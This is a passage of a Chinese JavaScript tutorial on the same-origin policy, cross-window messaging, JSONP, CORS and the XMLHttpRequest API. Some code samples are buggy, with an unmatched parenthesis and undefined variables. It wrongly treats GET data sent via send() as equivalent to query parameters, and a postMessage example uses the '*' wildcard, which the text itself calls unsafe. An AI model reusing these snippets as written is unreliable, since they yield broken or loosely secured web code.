另外，服务器也可以在设置 `Cookie` 的时候，指定 `Cookie` 的所属域名为一级域名，比如.example.com。

`Set-Cookie: key=value; domain=.example.com; path=/`

这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 `Cookie`。

#### 3.iframe

`iframe`元素可以在当前网页之中，嵌入其他网页。每个`iframe`元素形成自己的窗口，即有自己的`window`对象。`iframe`窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。

比如，父窗口运行下面的命令，如果`iframe`窗口不是同源，就会报错。

```javascript
document.getElementById("myIFrame").contentWindow.document;
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
```

上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。

反之亦然，子窗口获取主窗口的 DOM 也会报错。

```javascript
window.parent.document.body;
// 报错
```

这种情况不仅适用于`iframe`窗口，还适用于`window.open`方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。

如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的`document.domain`属性，就可以规避同源政策，拿到 DOM。

对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。

---

- 片段识别符（fragment identifier）
- 跨文档通信 API（Cross-document messaging）

---

##### 3.1 片段识别符

片段标识符（fragment identifier）指的是，URL 的`#`号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。

父窗口可以把信息，写入子窗口的片段标识符。

```javascript
var src = originURL + "#" + data;
document.getElementById("myIFrame").src = src;
```

上面代码中，父窗口把所要传递的信息，写入 `iframe` 窗口的片段标识符。

子窗口通过监听`hashchange`事件得到通知。

```javascript
window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
```

同样的，子窗口也可以改变父窗口的片段标识符。

`parent.location.href = target + '#' + hash;`

##### 3.2 window.postMessage()

上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的 API：**跨文档通信 API（Cross-document messaging）**。

这个 API 为 window 对象新增了一个`window.postMessage`方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口 aaa.com 向子窗口 bbb.com 发消息，调用`postMessage`方法就可以了。

```javascript
// 父窗口打开一个子窗口
var popup = window.open("http://bbb.com", "title");
// 父窗口向子窗口发消息
popup.postMessage("Hello World!", "http://bbb.com");
```

`postMessage`方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为`*`，表示不限制域名，向所有窗口发送。

子窗口向父窗口发送消息的写法类似。

```javascript
// 子窗口向父窗口发消息
window.opener.postMessage("Nice to see you", "http://aaa.com");
```

父窗口和子窗口都可以通过`message`事件，监听对方的消息。

```javascript
// 父窗口和子窗口都可以用下面的代码，
// 监听 message 消息
window.addEventListener(
  "message",
  function(e) {
    console.log(e.data);
  },
  false
);
```

`message`事件的参数是事件对象`event`，提供以下三个属性。

---

- `event.source`：发送消息的窗口
- `event.origin`: 消息发向的网址
- `event.data`: 消息内容

---

下面的例子是，子窗口通过`event.source`属性引用父窗口，然后发送消息。

```javascript
window.addEventListener("message", receiveMessage);
function receiveMessage(event) {
  event.source.postMessage("Nice to see you!", "*");
}
```

上面代码有几个地方需要注意。首先，`receiveMessage`函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，`postMessage`方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。

`event.origin`属性可以过滤不是发给本窗口的消息。

```javascript
window.addEventListener("message", receiveMessage);
function receiveMessage(event) {
  if (event.origin !== "http://aaa.com") return;
  if (event.data === "Hello World") {
    event.source.postMessage("Hello", event.origin);
  } else {
    console.log(event.data);
  }
}
```

##### 3.3 LocalStorage

通过`window.postMessage`，读写其他窗口的 `LocalStorage` 也成为了可能。

下面是一个例子，主窗口写入 `iframe` 子窗口的`localStorage`。

```javascript
window.onmessage = function(e) {
  if (e.origin !== "http://bbb.com") {
    return;
  }
  var payload = JSON.parse(e.data);
  localStorage.setItem(payload.key, JSON.stringify(payload.data));
};
```

上面代码中，子窗口将父窗口发来的消息，写入自己的 `LocalStorage`。

父窗口发送消息的代码如下。

```javascript
var win = document.getElementsByTagName("iframe")[0].contentWindow;
var obj = { name: "Jack" };
win.postMessage(
  JSON.stringify({ key: "storage", data: obj }),
  "http://bbb.com"
);
```

加强版的子窗口接收消息的代码如下。

```javascript
window.onmessage = function(e) {
  if (e.origin !== "http://bbb.com") return;
  var payload = JSON.parse(e.data);
  switch (payload.method) {
    case "set":
      localStorage.setItem(payload.key, JSON.stringify(payload.data));
      break;
    case "get":
      var parent = window.parent;
      var data = localStorage.getItem(payload.key);
      parent.postMessage(data, "http://aaa.com");
      break;
    case "remove":
      localStorage.removeItem(payload.key);
      break;
  }
};
```

加强版的父窗口发送消息代码如下。

```javascript
var win = document.getElementsByTagName("iframe")[0].contentWindow;
var obj = { name: "Jack" };
// 存入对象
win.postMessage(
  JSON.stringify({ key: "storage", method: "set", data: obj }),
  "http://bbb.com"
);
// 读取对象
win.postMessage(JSON.stringify({ key: "storage", method: "get" }), "*");
window.onmessage = function(e) {
  if (e.origin != "http://aaa.com") return;
  console.log(JSON.parse(e.data).name);
};
```

#### 4.AJAX

同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。

除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。

---

- JSONP
- WebSocket
- CORS

---

##### 4.1 JSONP

JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务端改造非常小。

它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。

首先，网页动态插入`<script>`元素，由它向跨源网址发出请求。

```javascript
function addScriptTag(src) {
  var script = document.createElement("script");
  script.setAttribute("type", "text/javascript");
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function() {
  addScriptTag("http://example.com/ip?callback=foo");
};

function foo(data) {
  console.log("Your public IP address is: " + data.ip);
}
```

上面代码通过动态添加`<script>`元素，向服务器`example.com`发出请求。注意，该请求的查询字符串有一个`callback`参数，用来指定回调函数的名字，这对于 JSONP 是必需的。

服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。

```javascript
foo({
  ip: "8.8.8.8"
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了 foo 函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用`JSON.parse`的步骤。

##### 4.2 WebSocket

`WebSocket` 是一种通信协议，使用`ws://（非加密）`和`wss://（加密）`作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。

下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自维基百科）。

```javascript
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
```

上面代码中，有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。

正是因为有了`Origin`这个字段，所以 `WebSocket` 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。

```javascript
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
```

##### 4.3 CORS

`CORS` 是**跨源资源分享（Cross-Origin Resource Sharing）**的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发 GET 请求，CORS 允许任何类型的请求。

### 7.AJAX

AJAX(Async Javascript and XML)。浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。

1999 年，微软公司发布 IE 浏览器 5.0 版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到 2004 年 Gmail 发布和 2005 年 Google Map 发布，才引起广泛重视。2005 年 2 月，AJAX 这个词第一次正式提出，指围绕这个功能进行开发的一整套做法。从此，AJAX 成为脚本发起 HTTP 通信的代名词，W3C 也在 2006 年发布了它的国际标准。

具体来说，AJAX 包括以下几个步骤。

---

- a.创建 AJAX 对象
- b.发出 HTTP 请求
- c.接收服务器传回的数据
- d.更新网页数据

---

概括起来，就是一句话，AJAX 通过原生的`XMLHttpRequest`对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。

AJAX 可以是同步请求，也可以是异步请求。但是，大多数情况下，特指异步请求。因为同步的 Ajax 请求，对浏览器有“堵塞效应”。

#### 1.XMLHttpRequest 对象

`XMLHttpRequest`对象用来在浏览器与服务器之间传送数据。

```javascript
// 1.创建一个ajax的异步对象
let xhr = new XMLHttpRequest();

// 2.配置ajax参数
xhr.open(meth, url, sync / async, [user.name, [user.password]]);

//第一个参数
//meth:请求方式"get/post"
//  get系列:
//  get : 一般是用来获取数据的
//  delete : 一般用来从服务器删除某些资源
//  head : 一般用来获取响应头，获取不到响应主体
//  post系列:
//  post : 一般都是客户端向服务器发送大量数据，比如表单提交、登录注册
//  put : 一般用来将资源存放到服务器上

//第二个参数
//url:请求地址（API）

//第三个参数
//sync/async:是否异步（默认true）

//user.name,user.password
//用来限制用户访问某些服务器，一般不设置，只在特殊需要时，才设置，并且访问时需要账户和密码才能访问服务器
```

然后，AJAX 指定回调函数，监听通信状态（`readyState`属性）的变化。

`ajax.onreadystatechange = handleStateChange;`

一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新相关部分，从而不打断用户正在做的事情。

注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨源请求，就会报错。

虽然名字里面有 XML，但是实际上，`XMLHttpRequest`可以报送各种数据，包括字符串和二进制，而且除了 HTTP，它还支持通过其他协议传送（比如 File 和 FTP）。

下面是`XMLHttpRequest`对象的典型用法。

```javascript
var xhr = new XMLHttpRequest();

// 指定通信过程中状态改变时的回调函数
xhr.onreadystatechange = function(){
  // 通信成功时，状态值为4
  if (xhr.readyState === 4){
    if (xhr.status === 200){
      console.log(xhr.responseText);
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.onerror = function (e) {
  console.error(xhr.statusText);
};

// open方式用于指定HTTP动词、请求的网址、是否异步
xhr.open('GET', '/endpoint', true);

//服务器与客户端交互的返回方式：
响应头(Response Header)：
xhr.getResponseHeader("请求数据名")  //获取响应头
xhr.getAllResponseHeaders()  //获取响应头全部信息
响应主体：
xhr.responseText

//客户端发送请求的多种方式：
请求头：
xhr.setRequestHeader()  //设置请求头信息（一般是设置请求数据类型）
xhr.timeout   //设置请求的超时时间，超过规定时间没有获得响应，请求失败，同时触发ontimeout事件（由超时行为触发），并且报错，

请求主体：

URL拼接查询参数：

// 发送HTTP请求
xhr.send(null);
```

#### 2.XMLHttpRequest 实例的属性

##### 2.1 readyState

`readyState`是一个只读属性，用一个整数和对应的常量，表示`XMLHttpRequest`请求当前所处的状态。

---

- 0，对应常量`UNSENT`，表示`XMLHttpRequest`实例已经生成，但是`open()`方法还没有被调用。

---

- 1，对应常量`OPENED`，表示`send()`方法还没有被调用，`open()`执行后的状态，仍然可以使用`setRequestHeader()`，设定 HTTP 请求的头信息。

---

- 2，对应常量`HEADERS_RECEIVED`，表示`send()`方法已经执行，并且头信息和状态码已经收到。

---

- 3，对应常量`LOADING`，表示正在接收服务器传来的 body 部分的数据，如果`responseType`属性是`text`或者空字符串，`responseText`就会包含已经收到的部分信息。

---

- 4，对应常量`DONE`，表示服务器数据已经完全接收，或者本次接收已经失败了。

---

在通信过程中，每当发生状态变化的时候，`readyState`属性的值就会发生改变。这个值每一次变化，都会触发`readyStateChange`事件。

```javascript
if (ajax.readyState == 4) {
  // Handle the response.
} else {
  // Show the 'Loading...' message or do nothing.
}
```

上面代码表示，只有`readyState`变为 4 时，才算确认请求已经成功，其他值都表示请求还在进行中。

##### 2.2 onreadystatechange

`onreadystatechange`属性指向一个回调函数，当`readystatechange`事件发生的时候，这个回调函数就会调用，并且`XMLHttpRequest`实例的`readyState`属性也会发生变化。

另外，如果使用`abort()`方法，终止`XMLHttpRequest`请求，`onreadystatechange`回调函数也会被调用。

```javascript
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", "http://example.com", true);
xmlhttp.onreadystatechange = function() {
  if (XMLHttpRequest.DONE != xmlhttp.readyState) {
    return;
  }
  if (200 != xmlhttp.status) {
    return;
  }
  console.log(xmlhttp.responseText);
};
xmlhttp.send();
```

##### 2.3 response

`response`属性为只读，返回接收到的数据体（即 body 部分）。它的类型可以是 ArrayBuffer、Blob、Document、JSON 对象、或者一个字符串，这由`XMLHttpRequest.responseType`属性的值决定。

如果本次请求没有成功或者数据不完整，该属性就会等于`null`。

##### 2.4 responseType

`responseType`属性用来指定服务器返回数据（`xhr.response`）的类型。

```javascript
- ”“：字符串（默认值）
- “arraybuffer”：ArrayBuffer对象
- “blob”：Blob对象
- “document”：Document对象
- “json”：JSON对象
- “text”：字符串
```

`text`类型适合大多数情况，而且直接处理文本也比较方便，`document`类型适合返回 XML 文档的情况，`blob`类型适合读取二进制数据，比如图片文件。

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/path/to/image.png", true);
xhr.responseType = "blob";

xhr.onload = function(e) {
  if (this.status == 200) {
    var blob = new Blob([this.response], { type: "image/png" });
    // 或者
    var blob = oReq.response;
  }
};

xhr.send();
```

如果将这个属性设为`ArrayBuffer`，就可以按照数组的方式处理二进制数据。

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/path/to/image.png", true);
xhr.responseType = "arraybuffer";

xhr.onload = function(e) {
  var uInt8Array = new Uint8Array(this.response);
  for (var i = 0, len = binStr.length; i < len; ++i) {
    // var byte = uInt8Array[i];
  }
};

xhr.send();
```

如果将这个属性设为“json”，支持 JSON 的浏览器（Firefox>9，chrome>30），就会自动对返回数据调用`JSON.parse()`方法。也就是说，你从`xhr.response`属性（注意，不是`xhr.responseText`属性）得到的不是文本，而是一个 JSON 对象。

XHR2 支持 Ajax 的返回类型为文档，即`xhr.responseType=”document”`。这意味着，对于那些打开 CORS 的网站，我们可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对 XHR 回应进行 DOM 操作。

##### 2.5 responseText

`responseText`属性返回从服务器接收到的字符串，该属性为只读。如果本次请求没有成功或者数据不完整，该属性就会等于`null`。

如果服务器返回的数据格式是 JSON，就可以使用`responseText`属性。

```javascript
var data = ajax.responseText;
data = JSON.parse(data);
```

##### 2.6 responseXML

`responseXML`属性返回从服务器接收到的 Document 对象，该属性为只读。如果本次请求没有成功，或者数据不完整，或者不能被解析为 XML 或 HTML，该属性等于`null`。

返回的数据会被直接解析为 DOM 对象。

```javascript
/* 返回的XML文件如下
  <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
  <book>
      <chapter id="1">(Re-)Introducing JavaScript</chapter>
      <chapter id="2">JavaScript in Action</chapter>
  </book>
*/

var data = ajax.responseXML;
var chapters = data.getElementsByTagName("chapter");
```

如果服务器返回的数据，没有明示`Content-Type`头信息等于`text/xml`，可以使用`overrideMimeType()`方法，指定`XMLHttpRequest`对象将返回的数据解析为 XML。

##### 2.7 status

`status`属性为只读属性，表示本次请求所得到的 HTTP 状态码，它是一个整数。一般来说，如果通信成功的话，这个状态码是 200。

---

- 200, OK，访问正常
- 301, Moved Permanently，永久移动/永久重定向
- 302, Move temporarily，暂时移动/临时重定向或临时转义（服务器的负载均衡）
- 304, Not Modified，未修改/读取缓存(多次进行同一请求，改走缓存，以减轻服务器的访问压力)
- 307, Temporary Redirect，暂时重定向
- 400:请求参数错误
- 401, Unauthorized，未授权/权限错误
- 403, Forbidden，禁止访问
- 404, Not Found，未发现指定网址/请求地址不存在
- 500, Internal Server Error，服务器发生错误
- 503:服务器崩溃/超负荷

---

> 基本上，只有 2xx 和 304 的状态码，表示服务器返回是正常状态。

```javascript
if (ajax.readyState == 4) {
  if ((ajax.status >= 200 && ajax.status < 300) || ajax.status == 304) {
    // Handle the response.
  } else {
    // Status error!
  }
}
```

##### 2.8 statusText

`statusText`属性为只读属性，返回一个字符串，表示服务器发送的状态提示。不同于`status`属性，该属性包含整个状态信息，比如”200 OK“。

##### 2.9 timeout

`timeout`属性等于一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于 0，就表示没有时间限制。

```javascript
  var xhr = new XMLHttpRequest();
  xhr.ontimeout = function () {
    console.error("The request for " + url + " timed out.");
  };
  xhr.onload = function() {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        callback.apply(xhr, args);
      } else {
        console.error(xhr.statusText);
      }
    }
  };
  xhr.open("GET", url, true);
  xhr.timeout = timeout;
  xhr.send(null);
}
```

##### 2.10 事件监听接口

`XMLHttpRequest`第一版，只能对`onreadystatechange`这一个事件指定回调函数。该事件对所有情况作出响应。 `XMLHttpRequest`第二版允许对更多的事件指定回调函数。

---

- onloadstart 请求发出
- onprogress 正在发送和加载数据
- onabort 请求被中止，比如用户调用了`abort()`方法
- onerror 请求失败
- onload 请求成功完成
- ontimeout 用户指定的时限到期，请求还未完成
- onloadend 请求完成，不管成果或失败

---

```javascript
xhr.onload = function() {
  var responseText = xhr.responseText;
  console.log(responseText);
  // process the response.
};

xhr.onerror = function() {
  console.log("There was an error!");
};
```

注意，如果发生网络错误（比如服务器无法连通），`onerror`事件无法获取报错信息，所以只能显示报错。

##### 2.11 withCredentials

`withCredentials`属性是一个布尔值，表示跨域请求时，用户信息（比如`Cookie`和认证的 HTTP 头信息）是否会包含在请求之中，默认为 false。即向`example.com`发出跨域请求时，不会发送 example.com 设置在本机上的`Cookie`（如果有的话）。

如果你需要通过跨域 AJAX 发送`Cookie`，需要打开`withCredentials`。

`xhr.withCredentials = true;`

为了让这个属性生效，服务器必须显式返回`Access-Control-Allow-Credentials`这个头信息。

`Access-Control-Allow-Credentials: true`

`.withCredentials`属性打开的话，不仅会发送`Cookie`，还会设置远程主机指定的`Cookie`。注意，此时你的脚本还是遵守同源政策，无法 从`document.cookie`或者 HTTP 回应的头信息之中，读取这些`Cookie`。

#### 3.XMLHttpRequest 实例的方法

##### 3.1 abort()

`abort`方法用来终止已经发出的 HTTP 请求。

```javascript
ajax.open("GET", "http://www.example.com/page.php", true);
var ajaxAbortTimer = setTimeout(function() {
  if (ajax) {
    ajax.abort();
    ajax = null;
  }
}, 5000);
```

上面代码在发出 5 秒之后，终止一个 AJAX 请求。

##### 3.2 getAllResponseHeaders()

`getAllResponseHeaders`方法返回服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用 CRLF 分隔，如果没有受到服务器回应，该属性返回`null`。

##### 3.3 getResponseHeader()

`getResponseHeader`方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，则该属性为`null`。

```javascript
function getHeaderTime() {
  console.log(this.getResponseHeader("Last-Modified"));
}

var oReq = new XMLHttpRequest();
oReq.open("HEAD", "yourpage.html");
oReq.onload = getHeaderTime;
oReq.send();
```

如果有多个字段同名，则它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。

##### 3.4 open()

`XMLHttpRequest`对象的`open`方法用于指定发送 HTTP 请求的参数，它的使用格式如下，一共可以接受五个参数。

```javascript
void open(
   string method,
   string url,
   optional boolean async,
   optional string user,
   optional string password
);
```

---

- `method`：表示 HTTP 动词，比如“GET”、“POST”、“PUT”和“DELETE”。
- `url`: 表示请求发送的网址。
- `async`: 格式为布尔值，默认为 true，表示请求是否为异步。如果设为 false，则 send()方法只有等到收到服务器返回的结果，才会有返回值。
- `user`：表示用于认证的用户名，默认为空字符串。
- `password`：表示用于认证的密码，默认为空字符串。

---

> 如果对使用过`open()`方法的请求，再次使用这个方法，等同于调用`abort()`。

下面发送 POST 请求的例子。

```javascript
xhr.open("POST", encodeURI("someURL"));
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.onload = function() {};
xhr.send(encodeURI("dataString"));
```

上面方法中，`open`方法向指定 URL 发出 POST 请求，`send`方法送出实际的数据。

下面是一个同步 AJAX 请求的例子。

```javascript
var request = new XMLHttpRequest();
request.open("GET", "/bar/foo.txt", false);
request.send(null);

if (request.status === 200) {
  console.log(request.responseText);
}
```

##### 3.5 send()

`send`方法用于实际发出 HTTP 请求。如果不带参数，就表示 HTTP 请求只包含头信息，也就是只有一个 URL，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。

```javascript
ajax.open('GET'
  , 'http://www.example.com/somepage.php?id=' + encodeURIComponent(id)
  , true
);

// 等同于
var data = 'id=' + encodeURIComponent(id));
ajax.open('GET', 'http://www.example.com/somepage.php', true);
ajax.send(data);
```

上面代码中，GET 请求的参数，可以作为查询字符串附加在 URL 后面，也可以作为`send`方法的参数。

下面是发送 POST 请求的例子。

```javascript
var data =
  "email=" +
  encodeURIComponent(email) +
  "&password=" +
  encodeURIComponent(password);
ajax.open("POST", "http://www.example.com/somepage.php", true);
ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajax.send(data);
```

如果请求是异步的（默认为异步），该方法在发出请求后会立即返回。如果请求为同步，该方法只有等到收到服务器回应后，才会返回。

注意，所有`XMLHttpRequest`的监听事件，都必须在`send()`方法调用之前设定。

`send`方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。

```javascript
void send();
void send(ArrayBufferView data);
void send(Blob data);
void send(Document data);
void send(String data);
void send(FormData data);
```

如果发送`Document`数据，在发送之前，数据会先被串行化。

发送二进制数据，最好使用`ArrayBufferView`或`Blob`对象，这使得通过 Ajax 上传文件成为可能。

下面是一个上传`ArrayBuffer`对象的例子。

```javascript
function sendArrayBuffer() {
  var xhr = new XMLHttpRequest();
  var uInt8Array = new Uint8Array([1, 2, 3]);

  xhr.open('POST', '/server', true);
  xhr.onload = function(e) { ... };
  xhr.send(uInt8Array.buffer);
}
```

`FormData`类型可以用于构造表单数据。

```javascript
var formData = new FormData();

formData.append("username", "张三");
formData.append("email", "zhangsan@example.com");
formData.append("birthDate", 1940);

var xhr = new XMLHttpRequest();
xhr.open("POST", "/register");
xhr.send(formData);
```

上面的代码构造了一个 formData 对象，然后使用`send`方法发送。它的效果与点击下面表单的`submit`按钮是一样的。

```javascript
<form id='registration' name='registration' action='/register'>
    <input type='text' name='username' value='张三'>
    <input type='email' name='email' value='zhangsan@example.com'>
    <input type='number' name='birthDate' value='1940'>
    <input type='submit' onclick='return sendForm(this.form);'>
</form>
```

`FormData`也可以将现有表单构造生成。

```javascript
var formElement = document.querySelector("form");
var request = new XMLHttpRequest();
request.open("POST", "submitform.php");
request.send(new FormData(formElement));
```

`FormData`对象还可以对现有表单添加数据，这为我们操作表单提供了极大的灵活性。

```javascript
function sendForm(form) {
  var formData = new FormData(form);
  formData.append("csrf", "e69a18d7db1286040586e6da1950128c");

  var xhr = new XMLHttpRequest();
  xhr.open("POST", form.action, true);
  xhr.onload = function(e) {
    // ...
  };
  xhr.send(formData);

  return false;
}

var form = document.querySelector("#registration");
sendForm(form);
```

FormData 对象也能用来模拟 File 控件，进行文件上传。

```javascript
function uploadFiles(url, files) {
  var formData = new FormData();

  for (var i = 0, file; file = files[i]; ++i) {
    formData.append(file.name, file); // 可加入第三个参数，表示文件名
  }

  var xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.onload = function(e) { ... };

  xhr.send(formData);  // multipart/form-data
}

document.querySelector('input[type="file"]').addEventListener('change', function(e) {
  uploadFiles('/server', this.files);
}, false);
```

`FormData`也可以加入 JavaScript 生成的文件。

```javascript
// 添加JavaScript生成的文件
var content = '<a id="a"><b id="b">hey!</b></a>';
var blob = new Blob([content], { type: "text/xml" });
formData.append("webmasterfile", blob);
```

##### 3.6 setRequestHeader()

`setRequestHeader`方法用于设置 HTTP 头信息。该方法必须在`open()`之后、`send()`之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。

```javascript
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("Content-Length", JSON.stringify(data).length);
xhr.send(JSON.stringify(data));
```

上面代码首先设置头信息`Content-Type`，表示发送 JSON 格式的数据；然后设置`Content-Length`，表示数据长度；最后发送 JSON 数据。

##### 3.7 overrideMimeType()

该方法用来指定服务器返回数据的 MIME 类型。该方法必须在`send()`之前调用。

传统上，如果希望从服务器取回二进制数据，就要使用这个方法，人为将数据类型伪装成文本数据。

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/path/to/image.png", true);

// 强制将MIME改为文本类型
xhr.overrideMimeType("text/plain; charset=x-user-defined");

xhr.onreadystatechange = function(e) {
  if (this.readyState == 4 && this.status == 200) {
    var binStr = this.responseText;
    for (var i = 0, len = binStr.length; i < len; ++i) {
      var c = binStr.charCodeAt(i);
      var byte = c & 0xff; // 去除高位字节，留下低位字节
    }
  }
};

xhr.send();
```

上面代码中，因为传回来的是二进制数据，首先用`xhr.overrideMimeType`方法强制改变它的 MIME 类型，伪装成文本数据。字符集必需指定为“`x-user-defined`”，如果是其他字符集，浏览器内部会强制转码，将其保存成 UTF-16 的形式。字符集“`x-user-defined`”其实也会发生转码，浏览器会在每个字节前面再加上一个字节（0xF700-0xF7ff），因此后面要对每个字符进行一次与运算（`&`），将高位的 8 个位去除，只留下低位的 8 个位，由此逐一读出原文件二进制数据的每个字节。

这种方法很麻烦，在`XMLHttpRequest`版本升级以后，一般采用指定`responseType`的方法。

```javascript
var xhr = new XMLHttpRequest();
xhr.onload = function(e) {
  var arraybuffer = xhr.response;
  // ...
};
xhr.open("GET", url);
xhr.responseType = "arraybuffer";
xhr.send();
```

#### 4.XMLHttpRequest 实例的事件

##### 4.1 readyStateChange 事件

`readyState`属性的值发生改变，就会触发`readyStateChange`事件。

我们可以通过`onReadyStateChange`属性，指定这个事件的回调函数，对不同状态进行不同处理。尤其是当状态变为 4 的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。

##### 4.2 progress 事件

上传文件时，`XMLHTTPRequest`对象的`upload`属性有一个`progress`，会不断返回上传的进度。

假定网页上有一个`progress`元素。

`<progress min="0" max="100" value="0">0% complete</progress>`

文件上传时，对`upload`属性指定`progress`事件回调函数，即可获得上传的进度。

```javascript
function upload(blobOrFile) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/server', true);
  xhr.onload = function(e) { ... };

  // Listen to the upload progress.
  var progressBar = document.querySelector('progress');
  xhr.upload.onprogress = function(e) {
    if (e.lengthComputable) {
      progressBar.value = (e.loaded / e.total) * 100;
      progressBar.textContent = progressBar.value; // Fallback for unsupported browsers.
    }
  };

  xhr.send(blobOrFile);
}

upload(new Blob(['hello world'], {type: 'text/plain'}));
```

##### 4.3 load 事件、error 事件、abort 事件

`load`事件表示服务器传来的数据接收完毕，`error`事件表示请求出错，`abort`事件表示请求被中断。

```javascript
var xhr = new XMLHttpRequest();

xhr.addEventListener("progress", updateProgress);
xhr.addEventListener("load", transferComplete);
xhr.addEventListener("error", transferFailed);
xhr.addEventListener("abort", transferCanceled);

xhr.open();

function updateProgress(oEvent) {
  if (oEvent.lengthComputable) {
    var percentComplete = oEvent.loaded / oEvent.total;
    // ...
  } else {
    // 回应的总数据量未知，导致无法计算百分比
  }
}

function transferComplete(evt) {
  console.log("The transfer is complete.");
}

function transferFailed(evt) {
  console.log("An error occurred while transferring the file.");
}

function transferCanceled(evt) {
  console.log("The transfer has been canceled by the user.");
}
```

##### 4.4 loadend 事件

`abort`、`load`和`error`这三个事件，会伴随一个`loadend`事件，表示请求结束，但不知道其是否成功。

```javascript
req.addEventListener("loadend", loadEnd);

function loadEnd(e) {
  alert("请求结束（不知道是否成功）");
}
```

#### 5."get"和"post"请求的区别

1).传递参数的方式

- get 请求的参数放置在 URL 上，通过"`？参数=值&参数=值`"的形式传递，`xhr.open("get","url")`；
- post 请求的参数放置在请求主体中，`xhr.send('参数=值&参数=值')`

  2).参数大小限制
  浏览器对 URL 大小有限制，超出部分会自动截取；post 的请求主体没有大小限制（实际操作中会有一定程度上的限制，过大的请求数据会分次请求，以保证请求速度）；

  3).安全性
  get 请求的参数显示在 URL 上，安全性极低；一般考虑安全性时，会使用 post 请求

  4).缓存
  get 请求的 URL 问号传参很容易走缓存，一般在 URL 后面拼接一个时间戳，来防止缓存；post 请求不会走缓存；

#### 6.文件上传

HTML 网页的`<form>`元素能够以四种格式，向服务器发送数据。

1).使用 POST 方法，将`enctype`属性设为`application/x-www-form-urlencoded`，这是默认方法。

```javascript
<form
  action="register.php"
  method="post"
  onsubmit="AJAXSubmit(this); return false;"
/>
```

2).使用 POST 方法，将`enctype`属性设为`text/plain`。

```javascript
<form
  action="register.php"
  method="post"
  enctype="text/plain"
  onsubmit="AJAXSubmit(this); return false;"
/>
```

3).使用 POST 方法，将`enctype`属性设为`multipart/form-data`。

```javascript
<form
  action="register.php"
  method="post"
  enctype="multipart/form-data"
  onsubmit="AJAXSubmit(this); return false;"
/>
```

4).使用 GET 方法，`enctype`属性将被忽略。

```javascript
<form
  action="register.php"
  method="get"
  onsubmit="AJAXSubmit(this); return false;"
/>
```

某个表单有两个字段，分别是 foo 和 baz，其中 foo 字段的值等于 bar，baz 字段的值一个分为两行的字符串。上面四种方法，都可以将这个表单发送到服务器。

---

